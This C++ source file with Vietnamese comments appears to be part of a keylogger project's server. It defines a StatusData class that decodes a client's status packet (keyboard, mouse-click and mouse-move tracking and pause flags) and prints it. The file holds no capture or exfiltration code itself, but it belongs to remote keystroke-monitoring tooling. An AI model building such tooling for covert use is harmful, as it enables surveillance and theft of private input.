#include "StatusData.hpp"
#include "TimestampHandle.hpp"
#include <cstring>
#include <iostream>

using namespace std;

/* StatusData
+ Khởi tạo một đối tượng StatusData với tất cả các trạng thái theo 
mặc định là false.
*/
StatusData::StatusData() : _status({false, false, false, false}) {}

/* StatusData
+ Constructor này chấp nhận một vectơ data chứa dữ liệu từ gói tin trả 
về từ máy khách.
+ Nó kiểm tra kích thước của data để đảm bảo nó đủ lớn để chứa thông 
tin trạng thái.
+ Nếu kích thước đủ lớn, nó sao chép dữ liệu trạng thái từ data vào _status.
*/
StatusData::StatusData(const vector<char> &data){
    if (data.size() < sizeof(int) + sizeof(PTITKeyLogger::t_status)){
        cerr << "Invalid size for VALID_GET_STATUS_RESPONSE." << endl;
        return;
    }

    _status = *(reinterpret_cast<const PTITKeyLogger::t_status *>(
        &data[sizeof(int)]));
    
}

/* cloneObj
+ Phương thức này trả về một con trỏ shared_ptr mới cho một đối tượng 
StatusData được tạo từ dữ liệu data
*/
shared_ptr<IData> StatusData::cloneObj(const vector<char> &data){
        return (make_shared<StatusData>(data));
}

/* dump
+ Phương thức này in ra trạng thái của dữ liệu theo định dạng chuẩn.
*/
void StatusData::dump() const{
    cout << boolalpha << "type=Status :" << endl
                      << "Tracking Status : \n\t"
                      << "Keyboard=" << _status.keyboard_tracking << "\n\t"
                      << "Mouse click=" << _status.mouse_click_tracking << "\n\t"
                      << "Mouse move=" << _status.mouse_move_tracking << "\n\t"
                      << "Pause=" << _status.paused << noboolalpha << endl;

    cout << "Server >> "<< flush;
}

/* getData
+ Phương thức này trả về một chuỗi đại diện cho dữ liệu trạng thái.
*/
string StatusData::getData() const{
    return ("type=Status Keyboard=" + boolToString(_status.keyboard_tracking) +
            "MouseClick=" + boolToString(_status.mouse_click_tracking) +
            "MouseMove=" + boolToString(_status.mouse_move_tracking) +
            "Pause=" + boolToString(_status.paused));
}

/* feedObj
+ Phương thức này cũng thực hiện công việc tương tự như constructor 
StatusData(const std::vector<char> &data). Nó sao chép thông tin 
trạng thái từ data vào _status.
*/
void StatusData::feedObj(const vector<char> &data){
    if (data.size() < sizeof(int) + sizeof(PTITKeyLogger::t_status)){
        cerr << "Invalid size for VALID_GET_STATUS_RESPONSE." << endl;
        return;
    }

    _status = *(reinterpret_cast<const PTITKeyLogger::t_status *>(
        &data[sizeof(int)]));
}

const string StatusData::boolToString(const bool &val) const{
    return (val ? "True" : "False");
}